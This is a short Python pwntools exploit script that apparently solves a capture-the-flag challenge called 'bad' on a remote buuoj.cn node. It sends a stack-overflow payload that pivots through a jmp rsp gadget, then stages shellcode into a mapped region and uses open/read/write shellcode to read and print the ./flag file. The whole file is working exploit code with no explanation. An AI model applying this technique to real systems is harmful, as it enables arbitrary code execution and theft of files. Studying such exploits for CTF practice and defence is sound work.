#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *


sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context(arch="amd64",os="Linux",log_level='debug')

if(sys.argv[1] == 'l'):
	p = process("./bad")
	elf = ELF("./bad")
else:
	p = remote('node3.buuoj.cn',25335)
	elf = ELF("./bad")

mmap=0x123000
jmp_rsp=0x400A01

payload = (asm(shellcraft.read(0,mmap,0x100)) + asm("mov rax,0x123000;call rax")).ljust(0x28,'\x00')
payload+= p64(jmp_rsp) + asm("sub rsp,0x30;jmp rsp")

sda("have fun!\n",payload)


shellcode = shellcraft.open('./flag')
shellcode+= shellcraft.read(3,mmap,0x50)
shellcode+= shellcraft.write(1,mmap,0x50)
shellcode = asm(shellcode)

sleep(0.1)
sl(shellcode)

ia()
